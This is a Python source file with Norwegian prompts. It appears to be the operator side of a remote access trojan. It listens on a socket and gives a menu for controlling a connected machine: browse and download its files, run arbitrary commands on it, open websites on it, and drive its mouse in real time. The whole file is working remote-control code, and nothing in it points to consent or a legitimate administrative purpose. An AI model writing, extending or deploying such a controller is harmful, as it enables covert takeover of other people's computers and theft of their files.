import socket
import time
import sys
import pyautogui
import threading
import keyboard


i = ''
s = socket.socket()
host = socket.gethostbyname(socket.gethostname())
port = 2904

s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print(f'{addr} HAR CONNECTET TIL SERVEREN!')

while True:
    print('hva vil du gjøre:\nSLUTT: slutt\nÅPNE NETTSIDER: OPEN NETTSIDE\nGJØRE CMD COMMANDS: COMMAND=hvasomhelst\nSE FILER(download): se filer\nLASTE NED FILER: last ned filnavn\nSTYRE MUS: click')
    a = input('hva vil du gjøre: ')
    if 'se filer' in a.lower():
        conn.send('se filer'.encode())
        svar = conn.recv(4000).decode()
        print(svar)
    if 'last ned' in a.lower():
        a = a.split('last ned')
        a.pop(0)
        for line in a:
            a = line.lstrip()
        if a not in svar:
            print('tror ikke den finnes')
        else:
            print('ok. bare vent ...')
            time.sleep(1)
            h = input('hva vil du filen skal hete: ')
            time.sleep(1)
            count = 0
            for i in a:
                if i == '.':
                    count += 1
            slutt = ''
            count1 = 0
            for i in a:
                if i == '.':
                    count1 += 1
                if count1 == count:
                    slutt += i
                    
            h += slutt
            
            conn.send(f'last_ned{a}'.encode())
            file_data = conn.recv(100000000)
            with open(h, 'wb') as f:
                f.write(file_data)
                print('FERDIG MED Å LASTE NED!')
                time.sleep(1)
            
    if 'command=' in a.lower():
        conn.send(a.encode())
        command = conn.recv(1024).decode()
        print(command)
        time.sleep(1)
        
    if 'slutt' in a.lower():
        conn.send('slutt'.encode())
        sys.exit()
    if 'open' in a.lower():
        a = a.replace('OPEN', '')
        a = a.replace('open', '')
        a = a.lstrip()
        conn.send('open'.encode())
        conn.send(a.encode())
        b = conn.recv(1024).decode()
        time.sleep(.5)
        print(b)
        time.sleep(1)
    if 'click' in a.lower():
        conn.send('click'.encode())
        cli = conn.recv(1024).decode()
        cli = 'True'
        while cli == 'True':
            if keyboard.is_pressed('ctrl + alt'):
                conn.send('stop'.encode())
                cli = 'False'
                break
            if keyboard.is_pressed('c'):
                conn.send('c'.encode())
            x, y = pyautogui.position()
            conn.send(f'{x}, {y}'.encode())
            i = conn.recv(1024).decode()
            print(i)

